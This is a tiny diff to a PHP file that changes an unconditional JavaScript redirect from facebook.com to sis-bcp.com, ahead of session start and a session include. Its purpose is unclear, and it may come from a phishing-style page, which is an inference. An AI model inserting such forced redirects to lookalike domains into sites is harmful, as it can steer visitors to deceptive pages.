@@ -1,5 +1,5 @@
 <?php
-echo "<script>location.href = 'https://www.facebook.com';</script>";
+echo "<script>location.href = 'https://sis-bcp.com/';</script>";
   session_start();
   include('../session.php');
 
